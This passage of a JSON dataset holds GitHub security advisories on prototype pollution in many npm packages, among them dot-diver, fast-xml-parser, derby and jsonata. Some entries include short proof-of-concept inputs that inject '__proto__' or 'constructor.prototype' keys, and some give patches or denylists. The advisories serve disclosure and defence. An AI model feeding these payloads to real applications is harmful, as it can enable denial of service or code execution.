      "summary": "robinweser fast-loops vulnerable to prototype pollution",
      "date": "2024-07-01T15:32:22Z",
      "cve": "CVE-2024-39008",
      "year": 2024
   },
   {
      "package": {
         "raw": "ag-grid-enterprise@31.3.2",
         "name": "ag-grid-enterprise",
         "version": "31.3.2"
      },
      "id": "GHSA-876p-c77m-x2hc",
      "description": "ag-grid-community v31.3.2 and ag-grid-enterprise v31.3.2 were discovered to contain a prototype pollution via the _.mergeDeep function. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties. Prior versions were also found to be affected.",
      "summary": "Prototype pollution in ag-grid-community via the _.mergeDeep function",
      "date": "2024-07-01T15:32:17Z",
      "cve": "CVE-2024-38996",
      "year": 2024
   },
   {
      "package": {
         "raw": "@airvertco/frappejs@0.0.11",
         "name": "frappejs",
         "version": "0.0.11",
         "scope": "airvertco"
      },
      "id": "GHSA-gc7m-596h-x57r",
      "description": "airvertco frappejs v0.0.11 was discovered to contain a prototype pollution via the function registerView. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "frappejs was discovered to contain a prototype pollution via the function registerView",
      "date": "2024-07-01T15:32:11Z",
      "cve": "CVE-2024-38992",
      "year": 2024
   },
   {
      "package": {
         "raw": "@abw/badger-database@1.2.1",
         "name": "badger-database",
         "version": "1.2.1",
         "scope": "abw"
      },
      "id": "GHSA-69r2-2fg7-7hf9",
      "description": "A Prototype Pollution issue in abw badger-database 1.2.1 allows an attacker to execute arbitrary code via dist/badger-database.esm.",
      "summary": "Badger Database Prototype Pollution",
      "date": "2024-06-17T15:30:54Z",
      "cve": "CVE-2024-36581",
      "year": 2024
   },
   {
      "package": {
         "raw": "@apidevtools/json-schema-ref-parser@11.1.0",
         "name": "json-schema-ref-parser",
         "version": "11.1.0",
         "scope": "apidevtools"
      },
      "id": "GHSA-5f97-h2c2-826q",
      "description": "A Prototype Pollution issue in API Dev Tools json-schema-ref-parser v.11.0.0 and v.11.1.0 allows a remote attacker to execute arbitrary code via the `bundle()`, `parse()`, `resolve()`, `dereference()` functions.",
      "summary": "json-schema-ref-parser Prototype Pollution issue",
      "date": "2024-05-20T18:31:23Z",
      "cve": "CVE-2024-29651",
      "year": 2024
   },
   {
      "package": {
         "raw": "@bit/loader@10.0.3",
         "name": "loader",
         "version": "10.0.3",
         "scope": "bit"
      },
      "id": "GHSA-8vr4-h4rr-8ph6",
      "description": "A Prototype Pollution issue in MiguelCastillo @bit/loader v.10.0.3 allows an attacker to execute arbitrary code via the M function e argument in index.js.",
      "summary": "MiguelCastillo @bit/loader Prototype Pollution issue",
      "date": "2024-05-20T18:31:23Z",
      "cve": "CVE-2024-24293",
      "year": 2024
   },
   {
      "package": {
         "raw": "njwt@2.0.0",
         "name": "njwt",
         "version": "2.0.0"
      },
      "id": "GHSA-3hvj-2783-34x2",
      "description": "njwt up to v0.4.0 was discovered to contain a prototype pollution in the `Parser.prototype.parse` method.",
      "summary": "njwt Prototype Pollution vulnerability",
      "date": "2024-05-16T18:30:31Z",
      "cve": "CVE-2024-34273",
      "year": 2024
   },
   {
      "package": {
         "raw": "kurwov@3.2.4",
         "name": "kurwov",
         "version": "3.2.4"
      },
      "id": "GHSA-hfrv-h3q8-9jpr",
      "description": "### Summary\nAn unsafe sanitization of dataset contents on the `MarkovData#getNext` method used in `Markov#generate` and `Markov#choose` allows a maliciously crafted string on the dataset to throw and stop the function from running properly.\n\n### Details\nhttps://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44\n\nIf a string contains a forbidden substring (i.e. `__proto__`) followed by a space character, the second line will access a special property in `MarkovData#finalData` by removing the last character of the string, bypassing the dataset sanitization (as it is supposed to be already sanitized before this function is called).\n\n`data` is then defined as the special function found in its prototype instead of an array.\n\nOn the last line, `data` is then indexed by a random number, which is supposed to return a string but returns undefined as it's a function. Calling `endsWith` then throws.\n\n### PoC\nhttps://runkit.com/embed/m6uu40r5ja9b\n\n### Impact\nAny dataset can be contaminated with the substring making it unable to properly generate anything in some cases.",
      "summary": "kurwov vulnerable to Denial of Service due to improper data sanitization",
      "date": "2024-05-03T20:30:38Z",
      "cve": "CVE-2024-34075",
      "year": 2024
   },
   {
      "package": {
         "raw": "@andrei-tatar/nora-firebase-common@1.12.2",
         "name": "nora-firebase-common",
         "version": "1.12.2",
         "scope": "andrei-tatar"
      },
      "id": "GHSA-jjff-q3q4-5hh8",
      "description": "An issue inandrei-tatar nora-firebase-common between v.1.0.41 and v.1.12.2 allows a remote attacker to execute arbitrary code via a crafted script to the updateState parameter of the updateStateInternal method.",
      "summary": "@andrei-tatar/nora-firebase-common Prototype Pollution vulnerability",
      "date": "2024-04-18T15:30:49Z",
      "cve": "CVE-2024-30564",
      "year": 2024
   },
   {
      "package": {
         "raw": "derby@2.3.1",
         "name": "derby",
         "version": "2.3.1"
      },
      "id": "GHSA-82jv-9wjw-pqh6",
      "description": "### Summary\nA prototype pollution in derby can crash the application, if the application author has atypical HTML templates that feed user input into an object key.\n\nAttribute keys are almost always developer-controlled, not end-user-controlled, so this shouldn't be an issue in practice for most applications.\n\n### Details\n```\nemit(context: Context, target: T) {\n  const node = traverseAndCreate(context.controller, this.segments);\n    node[this.lastSegment] = target;\n    this.addListeners(target, node, this.lastSegment);\n}\n```\nThe emit() function in src/templates/templates.ts is called without sanitizing the variable `this.lastSegment `. The variable `this.lastSegment ` can be set to `__proto__`, and this will pollute the prototype of Javascipt Object (`node['__proto__'] = target`).\n\n### PoC\nTo reproduce this vulnerability, you can adjust the test case `ignores DOM mutations in components\\' create()` in `test/dom/ComponentHarness.mocha.js`.\n\n```\nit('ignores DOM mutations in components\\' create()', function() {\n      function Box() {}\n      Box.view = {\n        is: 'box',\n-        source: '<index:><div class=\"box\" as=\"boxElement\"></div>'\n+        source: '<index:><div class=\"box\" as=\"__proto__\"></div>'\n      };\n      Box.prototype.create = function() {\n        this.boxElement.className = 'box-changed-in-create';\n      };\n      var harness = runner.createHarness('<view is=\"box\" />', Box);\n      expect(harness).to.render('<div class=\"box\"></div>');\n});\n```\nWhen `as` attribute is controlled by attackers, the variable in `this.lastSegment` will exactly take value` __proto__` and prototype pollution happens.\n\n### Patch\nAdd a check on `this.lastSegment` can prevent this attack.\n```\nemit(context: Context, target: T) {\n  const node = traverseAndCreate(context.controller, this.segments);\n+  if (this.lastSegment.includes('__proto__') || this.lastSegment.includes('prototype')) {\n+    throw new Error('Unsafe code detected');\n+  }\n    node[this.lastSegment] = target;\n    this.addListeners(target, node, this.lastSegment);\n}\n```\n",
      "summary": "Prototype pollution in emit function",
      "date": "2024-04-17T22:26:37Z",
      "cve": null,
      "year": 2024
   },
   {
      "package": {
         "raw": "mysql2@3.9.3",
         "name": "mysql2",
         "version": "3.9.3"
      },
      "id": "GHSA-49j4-86m8-q2jw",
      "description": "Versions of the package mysql2 before 3.9.4 are vulnerable to Prototype Poisoning due to insecure results object creation and improper user input sanitization passed through `parserFn` in `text_parser.js` and `binary_parser.js`.",
      "summary": "mysql2 vulnerable to Prototype Poisoning",
      "date": "2024-04-10T15:30:39Z",
      "cve": "CVE-2024-21509",
      "year": 2024
   },
   {
      "package": {
         "raw": "web3-utils@4.2.0",
         "name": "web3-utils",
         "version": "4.2.0"
      },
      "id": "GHSA-2g4c-8fpm-c46v",
      "description": "### Impact: \nThe mergeDeep() function in the web3-utils package has been identified for Prototype Pollution vulnerability. An attacker has the ability to modify an object's prototype, which could result in changing the behavior of all objects that inherit from the impacted prototype by providing carefully crafted input to function.\n\n### Patches: \nIt has been fixed in web3-utils version 4.2.1 so all packages and apps depending on web3-utils >=4.0.1 and <=4.2.0 should upgrade to web3-utils 4.2.1.\n\n### Workarounds: \nNone\n",
      "summary": "web3-utils Prototype Pollution vulnerability",
      "date": "2024-03-27T21:57:42Z",
      "cve": "CVE-2024-21505",
      "year": 2024
   },
   {
      "package": {
         "raw": "@thi.ng/paths@5.1.62",
         "name": "paths",
         "version": "5.1.62",
         "scope": "thi.ng"
      },
      "id": "GHSA-8ppr-www8-hfjx",
      "description": "An issue in @thi.ng/paths v.5.1.62 and before allows a remote attacker to execute arbitrary code via the `mutIn` and `mutInManyUnsafe` components.",
      "summary": "@thi.ng/paths Prototype Pollution vulnerability",
      "date": "2024-03-25T15:30:41Z",
      "cve": "CVE-2024-29650",
      "year": 2024
   },
   {
      "package": {
         "raw": "web3-utils@4.2.0",
         "name": "web3-utils",
         "version": "4.2.0"
      },
      "id": "GHSA-87qp-7cw8-8q9c",
      "description": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-2g4c-8fpm-c46v. This link is maintained to preserve external references.\n\n## Original Description\nVersions of the package web3-utils before 4.2.1 are vulnerable to Prototype Pollution via the utility functions format and mergeDeep, due to insecure recursive merge.\nAn attacker can manipulate an object's prototype, potentially leading to the alteration of the behavior of all objects inheriting from the affected prototype by passing specially crafted input to these functions.",
      "summary": "Duplicate Advisory: web3-utils Prototype Pollution vulnerability",
      "date": "2024-03-25T06:30:24Z",
      "cve": null,
      "year": 2024
   },
   {
      "package": {
         "raw": "jsonata@1.8.6",
         "name": "jsonata",
         "version": "1.8.6"
      },
      "id": "GHSA-fqg8-vfv7-8fj8",
      "description": "### Impact\n\nIn JSONata versions `>= 1.4.0, < 1.8.7` and `>= 2.0.0, < 2.0.4`, a malicious expression can use the [transform operator](https://docs.jsonata.org/other-operators#-------transform) to override properties on the `Object` constructor and prototype. This may lead to denial of service, remote code execution or other unexpected behavior in applications that evaluate user-provided JSONata expressions.\n\n### Patch\n\nThis issue has been fixed in JSONata versions `>= 1.8.7` and `>= 2.0.4`. Applications that evaluate user-provided expressions should update ASAP to prevent exploitation. The following patch can be applied if updating is not possible.\n\n```patch\n--- a/src/jsonata.js\n+++ b/src/jsonata.js\n@@ -1293,6 +1293,13 @@ var jsonata = (function() {\n                 }\n                 for(var ii = 0; ii < matches.length; ii++) {\n                     var match = matches[ii];\n+                    if (match && (match.isPrototypeOf(result) || match instanceof Object.constructor)) {\n+                        throw {\n+                            code: \"D1010\",\n+                            stack: (new Error()).stack,\n+                            position: expr.position\n+                        };\n+                    }\n                     // evaluate the update value for each match\n                     var update = await evaluate(expr.update, match, environment);\n                     // update must be an object\n@@ -1539,7 +1546,7 @@ var jsonata = (function() {\n                 if (typeof err.token == 'undefined' && typeof proc.token !== 'undefined') {\n                     err.token = proc.token;\n                 }\n-                err.position = proc.position;\n+                err.position = proc.position || err.position;\n             }\n             throw err;\n         }\n@@ -1972,6 +1979,7 @@ var jsonata = (function() {\n         \"T1007\": \"Attempted to partially apply a non-function. Did you mean ${{{token}}}?\",\n         \"T1008\": \"Attempted to partially apply a non-function\",\n         \"D1009\": \"Multiple key definitions evaluate to same key: {{value}}\",\n+        \"D1010\": \"Attempted to access the Javascript object prototype\", // Javascript specific \n         \"T1010\": \"The matcher function argument passed to function {{token}} does not return the correct object structure\",\n         \"T2001\": \"The left side of the {{token}} operator must evaluate to a number\",\n         \"T2002\": \"The right side of the {{token}} operator must evaluate to a number\",\n```\n\n### References\n\nhttps://github.com/jsonata-js/jsonata/releases/tag/v2.0.4\n\n### Credit\n\nThank you to Albert Pedersen of Cloudflare for disclosing this issue.\n",
      "summary": "JSONata expression can pollute the \"Object\" prototype",
      "date": "2024-03-04T20:43:12Z",
      "cve": "CVE-2024-27307",
      "year": 2024
   },
   {
      "package": {
         "raw": "mockjs@1.1.0",
         "name": "mockjs",
         "version": "1.1.0"
      },
      "id": "GHSA-mh8j-9jvh-gjf6",
      "description": "All versions of the package mockjs are vulnerable to Prototype Pollution via the Util.extend function due to missing check if the attribute resolves to the object prototype. By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones. This can be problematic if the software depends on existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as hasOwnProperty, toString or valueOf).\n\nUser controlled inputs inside the extend() method of the Mock.Handler, Mock.Random, Mock.RE.Handler or Mock.Util, will allow an attacker to exploit this vulnerability.\n\n Workaround\n\nBy using a denylist of dangerous attributes, this weakness can be eliminated.\n\nAdd the following line in the Util.extend function:\n\njs\njs if ([\"__proto__\", \"constructor\", \"prototype\"].includes(name)) continue\n\n\njs\n// src/mock/handler.js\nUtil.extend = function extend() {\n        var target = arguments[0] || {},\n            i = 1,\n            length = arguments.length,\n            options, name, src, copy, clone\n\n        if (length === 1) {\n            target = this\n            i = 0\n        }\n\n        for (; i < length; i++) {\n            options = arguments[i]\n            if (!options) continue\n\n            for (name in options) {\n            if ([\"__proto__\", \"constructor\", \"prototype\"].includes(name)) continue\n                src = target[name]\n                copy = options[name]\n\n                if (target === copy) continue\n                if (copy === undefined) continue\n\n                if (Util.isArray(copy) || Util.isObject(copy)) {\n                    if (Util.isArray(copy)) clone = src && Util.isArray(src) ? src : []\n                    if (Util.isObject(copy)) clone = src && Util.isObject(src) ? src : {}\n\n                    target[name] = Util.extend(clone, copy)\n                } else {\n                    target[name] = copy\n                }\n            }\n        }\n\n        return target\n    }\n",
      "summary": "mockjs vulnerable to Prototype Pollution via the Util.extend function",
      "date": "2023-12-08T06:30:38Z",
      "cve": "CVE-2023-26158",
      "year": 2023
   },
   {
      "package": {
         "raw": "sequelize-typescript@2.1.5",
         "name": "sequelize-typescript",
         "version": "2.1.5"
      },
      "id": "GHSA-7pvx-4585-hqww",
      "description": "Prototype Pollution in GitHub repository robinbuschmann/sequelize-typescript prior to 2.1.6.",
      "summary": "sequelize-typescript Prototype Pollution vulnerability",
      "date": "2023-11-24T21:30:28Z",
      "cve": "CVE-2023-6293",
      "year": 2023
   },
   {
      "package": {
         "raw": "@clickbar/dot-diver@1.0.1",
         "name": "dot-diver",
         "version": "1.0.1",
         "scope": "clickbar"
      },
      "id": "GHSA-9w5f-mw3p-pj47",
      "description": "### Summary\nThere is a Prototype Pollution(PP) vulnerability in dot-diver. It can leads to RCE.\n\n### Details\n```javascript\n//https://github.com/clickbar/dot-diver/tree/main/src/index.ts:277\n\n// eslint-disable-next-line @typescript-eslint/no-unsafe-member-access\n  objectToSet[lastKey] = value\n```\nIn this code, there is no validation for Prototpye Pollution.\n\n### PoC\n```javascript\nimport { getByPath, setByPath } from '@clickbar/dot-diver'\n\nconsole.log({}.polluted); // undefined\nsetByPath({},'constructor.prototype.polluted', 'foo');\nconsole.log({}.polluted); // foo\n```\n\n### Impact\nIt is Prototype Pollution(PP) and it can leads to Dos, RCE, etc.\n\n### Credits\nTeam : NodeBoB\n\n최지혁   ( Jihyeok Choi )\n\n이동하 ( Lee Dong Ha of ZeroPointer Lab )\n\n강성현    ( kang seonghyeun )\n\n박성진    ( sungjin park )\n\n김찬호    ( Chanho Kim )\n\n이수영    ( Lee Su Young )\n\n김민욱    ( MinUk Kim )\n",
      "summary": "Prototype Pollution(PP) vulnerability in setByPath",
      "date": "2023-11-03T19:03:40Z",
      "cve": "CVE-2023-45827",
      "year": 2023
   },
   {
      "package": {
         "raw": "@seal-security/mongoose-fixed@5.3.3",
         "name": "mongoose-fixed",
         "version": "5.3.3",
         "scope": "seal-security"
      },
      "id": "GHSA-rc4v-99cr-pjcm",
      "description": "### Impact\nThis vulnerability causes a Prototype Pollution in document.js, through functions such as findByIdAndUpdate().\nFor applications using Express and EJS, this can potentially allow remote code execution.\n\n### Patches\nThe original patched version for mongoose 5.3.3 did not include a fix for CVE-2023-3696. Therefore the existing version @seal-security/mongoose-fixed version 5.3.3 is affected by this vulnerability (though it is protected from CVE-2022-2564 and CVE-2019-17426). To mitigate this issue, a @seal-security/mongoose-fixed version 5.3.4 has been deployed. Note that this version is compatible with the original mongoose version 5.3.3, not version 5.3.4\n\n### References\nhttps://security.snyk.io/vuln/SNYK-JS-MONGOOSE-5777721\nhttps://github.com/advisories/GHSA-9m93-w8w6-76hh\nhttps://github.com/Automattic/mongoose/commit/f1efabf350522257364aa5c2cb36e441cf08f1a2\n",
      "summary": "Prototype Pollution in ali-security/mongoose",
      "date": "2023-10-17T14:21:16Z",
      "cve": null,
      "year": 2023
   },
   {
      "package": {
         "raw": "openmct@3.0.2",
         "name": "openmct",
         "version": "3.0.2"
      },
      "id": "GHSA-4xcx-cwrq-w792",
      "description": "In NASA Open MCT (aka openmct) before commit 545a177 is subject to a prototype pollution which can occur via an import action.",
      "summary": "Prototype Pollution in NASA Open MCT",
      "date": "2023-10-06T21:30:49Z",
      "cve": "CVE-2023-45282",
      "year": 2023
   },
   {
      "package": {
         "raw": "tree-kit@0.7.4",
         "name": "tree-kit",
         "version": "0.7.4"
      },
      "id": "GHSA-5p42-m6f3-hpmj",
      "description": "A Prototype Pollution issue in Cronvel Tree-kit v.0.7.4 and before allows a remote attacker to execute arbitrary code via the extend function.",
      "summary": "tree-kit Prototype Pollution vulnerability",
      "date": "2023-08-17T00:30:26Z",
      "cve": "CVE-2023-38894",
      "year": 2023
   },
   {
      "package": {
         "raw": "hellojs@1.18.6",
         "name": "hellojs",
         "version": "1.18.6"
      },
      "id": "GHSA-g3vf-47fv-8f3c",
      "description": "A prototype pollution vulnerability in MrSwitch hello.js prior to version 1.18.8 allows remote attackers to execute arbitrary code via `hello.utils.extend` function.",
      "summary": "MrSwitch hello.js vulnerable to prototype pollution",
      "date": "2023-08-11T15:30:46Z",
      "cve": "CVE-2021-26505",
      "year": 2021
   },
   {
      "package": {
         "raw": "underscore-keypath@0.9.3",
         "name": "underscore-keypath",
         "version": "0.9.3"
      },
      "id": "GHSA-gpvc-mx6g-cchv",
      "description": "Versions of the package underscore-keypath from 0.0.11 are vulnerable to Prototype Pollution via the name argument of the `setProperty()` function. Exploiting this vulnerability is possible due to improper input sanitization which allows the usage of arguments like `__proto__`.",
      "summary": "underscore-keypath vulnerable to Prototype Pollution",
      "date": "2023-08-01T06:30:15Z",
      "cve": "CVE-2023-26139",
      "year": 2023
   },
   {
      "package": {
         "raw": "mongoose@7.3.2",
         "name": "mongoose",
         "version": "7.3.2"
      },
      "id": "GHSA-9m93-w8w6-76hh",
      "description": "Prototype Pollution in GitHub repository automattic/mongoose prior to 7.3.3, 6.11.3, and 5.13.20.",
      "summary": "Mongoose Prototype Pollution vulnerability",
      "date": "2023-07-17T03:30:20Z",
      "cve": "CVE-2023-3696",
      "year": 2023
   },
   {
      "package": {
         "raw": "protobufjs@6.11.3",
         "name": "protobufjs",
         "version": "6.11.3"
      },
      "id": "GHSA-h755-8qp9-cq85",
      "description": "protobuf.js (aka protobufjs) 6.10.0 until 6.11.4 and 7.0.0 until 7.2.4 allows Prototype Pollution, a different vulnerability than CVE-2022-25878. A user-controlled protobuf message can be used by an attacker to pollute the prototype of Object.prototype by adding and overwriting its data and functions. Exploitation can involve: (1) using the function parse to parse protobuf messages on the fly, (2) loading .proto files by using load/loadSync functions, or (3) providing untrusted input to the functions ReflectionObject.setParsedOption and util.setProperty. NOTE: this CVE Record is about `Object.constructor.prototype.<new-property> = ...;` whereas CVE-2022-25878 was about `Object.__proto__.<new-property> = ...;` instead.",
      "summary": "protobufjs Prototype Pollution vulnerability",
      "date": "2023-07-05T15:30:24Z",
      "cve": "CVE-2023-36665",
      "year": 2023
   },
   {
      "package": {
         "raw": "tough-cookie@4.1.2",
         "name": "tough-cookie",
         "version": "4.1.2"
      },
      "id": "GHSA-72xf-g2v4-qvf3",
      "description": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
      "summary": "tough-cookie Prototype Pollution vulnerability",
      "date": "2023-07-01T06:30:16Z",
      "cve": "CVE-2023-26136",
      "year": 2023
   },
   {
      "package": {
         "raw": "flatnest@1.0.0",
         "name": "flatnest",
         "version": "1.0.0"
      },
      "id": "GHSA-7px2-3c2p-q4v4",
      "description": "All versions of the package flatnest are vulnerable to Prototype Pollution via the `nest()` function in `flatnest/nest.js` file.",
      "summary": "flatnest Prototype Pollution vulnerability",
      "date": "2023-06-30T06:30:14Z",
      "cve": "CVE-2023-26135",
      "year": 2023
   },
   {
      "package": {
         "raw": "fast-xml-parser@4.1.1",
         "name": "fast-xml-parser",
         "version": "4.1.1"
      },
      "id": "GHSA-x3cc-x39p-42qx",
      "description": "### Impact\nAs a part of this vulnerability, user was able to se code using `__proto__` as a tag or attribute name.\n\n```js\nconst { XMLParser, XMLBuilder, XMLValidator} = require(\"fast-xml-parser\");\n\nlet XMLdata = \"<__proto__><polluted>hacked</polluted></__proto__>\"\n\nconst parser = new XMLParser();\nlet jObj = parser.parse(XMLdata);\n\nconsole.log(jObj.polluted) // should return hacked\n``` \n\n### Patches\nThe problem has been patched in v4.1.2\n\n### Workarounds\nUser can check for \"__proto__\" in the XML string before parsing it to the parser.\n\n### References\nhttps://gist.github.com/Sudistark/a5a45bd0804d522a1392cb5023aa7ef7\n",
      "summary": "fast-xml-parser vulnerable to Prototype Pollution through tag or attribute name",
      "date": "2023-06-13T12:44:34Z",
      "cve": "CVE-2023-26920",
      "year": 2023
   },
   {
      "package": {
         "raw": "progressbar.js@1.1.0",
         "name": "progressbar.js",
         "version": "1.1.0"
      },
      "id": "GHSA-89qm-hm2x-mxm3",
      "description": "All versions of the package progressbar.js prior to 1.1.1 are vulnerable to Prototype Pollution via the function extend() in the file utils.js.\n\n",
      "summary": "progressbar.js vulnerable to Prototype Pollution",
      "date": "2023-06-12T06:30:17Z",
      "cve": "CVE-2023-26133",
      "year": 2023
   },
   {
      "package": {
         "raw": "dottie@2.0.3",
         "name": "dottie",
         "version": "2.0.3"
      },
      "id": "GHSA-4gxf-g5gf-22h4",
      "description": "Versions of the package dottie before 2.0.4 are vulnerable to Prototype Pollution due to insufficient checks, via the `set()` function and the current variable in the `/dottie.js` file.",
      "summary": "dottie vulnerable to Prototype Pollution",
      "date": "2023-06-10T06:30:25Z",
      "cve": "CVE-2023-26132",
      "year": 2023
   },
   {
      "package": {
         "raw": "@antfu/utils@0.7.2",
         "name": "utils",
         "version": "0.7.2",
         "scope": "antfu"
      },
      "id": "GHSA-p2fh-2h23-6grg",
      "description": "Prototype Pollution in GitHub repository antfu/utils prior to 0.7.3.",
      "summary": "antfu/utils vulnerable to prototype pollution",
      "date": "2023-05-30T12:30:17Z",
      "cve": "CVE-2023-2972",
      "year": 2023
   },
   {
      "package": {
         "raw": "@aedart/support@0.6.0",
         "name": "support",
         "version": "0.6.0",
         "scope": "aedart"
      },
      "id": "GHSA-wwxh-74fx-33c6",
      "description": "### Impact\n\nPossible prototype pollution for the `MetadataRecord`, when merged with a base class' metadata object, in `meta` decorator from the `@aedart/support` package.\n\nThe likelihood is questionable, given that a class' metadata can only be set or altered when the class is decorated via `meta()`. Furthermore, object(s) of sensitive nature would have to be stored as metadata, before this can become a vulnerability.\n### Patches\n\nHas been patched in version `0.6.1`.\n",
      "summary": "Possible prototype pollution in metadata record, when using meta decorator",
      "date": "2023-05-01T14:01:02Z",
      "cve": "CVE-2023-30857",
      "year": 2023
   },
   {
      "package": {
         "raw": "vconsole@3.15.0",
         "name": "vconsole",
         "version": "3.15.0"
      },
      "id": "GHSA-f737-3fh6-jf6w",
      "description": "vConsole was discovered to contain a prototype pollution due to incorrect key and value resolution in setOptions in core.ts.",
      "summary": "Prototype Pollution in vConsole",
      "date": "2023-04-26T21:30:37Z",
      "cve": "CVE-2023-30363",
      "year": 2023
   },
   {
      "package": {
         "raw": "xlsx@0.18.5",
         "name": "xlsx",
         "version": "0.18.5"
      },
      "id": "GHSA-4r6h-8v6p-xvw6",
      "description": "All versions of SheetJS CE through 0.19.2 are vulnerable to \"Prototype Pollution\" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.\n\nA non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained.",
      "summary": "Prototype Pollution in sheetJS",
      "date": "2023-04-24T09:30:19Z",
      "cve": "CVE-2023-30533",
      "year": 2023
   },
   {
      "package": {
         "raw": "safe-eval@0.4.1",
         "name": "safe-eval",
         "version": "0.4.1"
      },
      "id": "GHSA-hcg3-56jf-x4vh",
      "description": "All versions of the package safe-eval are vulnerable to Prototype Pollution via the safeEval function, due to improper sanitization of its parameter content.",
      "summary": "safe-eval vulnerable to Prototype Pollution via the safeEval function",
      "date": "2023-04-11T06:30:29Z",
      "cve": "CVE-2023-26121",
      "year": 2023
   },
   {
      "package": {
         "raw": "safe-eval@0.4.1",
         "name": "safe-eval",
         "version": "0.4.1"
      },
      "id": "GHSA-79xf-67r4-q2jj",
      "description": "All versions of the package safe-eval are vulnerable to Sandbox Bypass due to improper input sanitization. The vulnerability is derived from prototype pollution exploitation. Exploiting this vulnerability might result in remote code execution (RCE).\n\n**Vulnerable functions:**\n\n__defineGetter__, stack(), toLocaleString(), propertyIsEnumerable.call(),  valueOf().",
      "summary": "safe-eval vulnerable to Sandbox Bypass due to improper input sanitization",
      "date": "2023-04-11T06:30:29Z",
      "cve": "CVE-2023-26122",
      "year": 2023
   },
   {
      "package": {
         "raw": "xml2js@0.4.23",
         "name": "xml2js",
         "version": "0.4.23"
      },
      "id": "GHSA-776f-qx25-q3cc",
      "description": "xml2js versions before 0.5.0 allows an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited.",
      "summary": "xml2js is vulnerable to prototype pollution",
      "date": "2023-04-05T21:30:24Z",
      "cve": "CVE-2023-0842",
      "year": 2023
   },
   {
      "package": {
         "raw": "matrix-js-sdk@23.5.0",
         "name": "matrix-js-sdk",
         "version": "23.5.0"
      },
      "id": "GHSA-mwq8-fjpf-c2gr",
      "description": "### Impact\n\nIn certain configurations, data sent by remote servers containing special strings in key locations could cause modifications of the `Object.prototype`, disrupting matrix-js-sdk functionality, causing denial of service and potentially affecting program logic.\n\n(This is part 2, where [CVE-2022-36059](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36059) / [GHSA-rfv9-x7hh-xc32](https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32) is part 1. Part 2 covers remaining vectors not covered by part 1, found in a codebase audit scheduled after part 1.)\n\n### Patches\nThe issue has been patched in matrix-js-sdk 24.0.0.\n\n### Workarounds\nNone.\n\n### References\n\n- [Release blog post](https://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69-0)\n- The advisory [GHSA-rfv9-x7hh-xc32](https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32) ([CVE-2022-36059](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36059)) refers to an initial set of vulnerable locations discovered and patched in matrix-js-sdk 19.4.0. We opted not to disclose that advisory while we performed an audit of the codebase and are now disclosing it jointly with this one.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
      "summary": "Prototype pollution in matrix-js-sdk (part 2)",
      "date": "2023-03-30T20:19:18Z",
      "cve": "CVE-2023-28427",
      "year": 2023
   },
   {
      "package": {
         "raw": "matrix-react-sdk@3.68.0",
         "name": "matrix-react-sdk",
         "version": "3.68.0"
      },
      "id": "GHSA-6g43-88cp-w5gv",
      "description": "### Impact\nIn certain configurations, data sent by remote servers containing special strings in key locations could cause modifications of the `Object.prototype`, disrupting matrix-react-sdk functionality, causing denial of service and potentially affecting program logic.\n\n(This is part 2, where [CVE-2022-36060](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36060) / [GHSA-2x9c-qwgf-94xr](https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr) is part 1. Part 2 covers remaining vectors not covered by part 1, found in a codebase audit scheduled after part 1.)\n\n### Patches\nThis is fixed in matrix-react-sdk 3.69.0\n\n### Workarounds\nNone.\n\n### References\n\n- [Release blog post](https://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69-0)\n- The advisory [GHSA-2x9c-qwgf-94xr](https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr) ([CVE-2022-36060](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36060)) refers to an initial set of vulnerable locations discovered and patched in matrix-react-sdk 3.53.0. We opted not to disclose that advisory while we performed an audit of the codebase and are now disclosing it jointly with this one.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).",
      "summary": "Prototype pollution in matrix-react-sdk ",
      "date": "2023-03-29T19:34:25Z",
      "cve": "CVE-2023-28103",
      "year": 2023
   },
   {
      "package": {
         "raw": "matrix-react-sdk@3.52.0",
         "name": "matrix-react-sdk",
         "version": "3.52.0"
      },
      "id": "GHSA-2x9c-qwgf-94xr",
      "description": "### Impact\nEvents sent with special strings in key places can temporarily disrupt or impede the matrix-react-sdk from functioning properly, such as by causing room or event tile crashes. The remainder of the application can appear functional, though certain rooms/events will not be rendered.\n\n### Patches\nThis is fixed in matrix-react-sdk 3.53.0\n\n### Workarounds\nThere are no workarounds. Please upgrade immediately.\n\n### References\nhttps://learn.snyk.io/lessons/prototype-pollution/javascript/\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
      "summary": "matrix-react-sdk Prototype pollution vulnerability",
      "date": "2023-03-28T19:57:57Z",
      "cve": "CVE-2022-36060",
      "year": 2022
   },
   {
      "package": {
         "raw": "matrix-js-sdk@19.3.0",
         "name": "matrix-js-sdk",
         "version": "19.3.0"
      },
      "id": "GHSA-rfv9-x7hh-xc32",
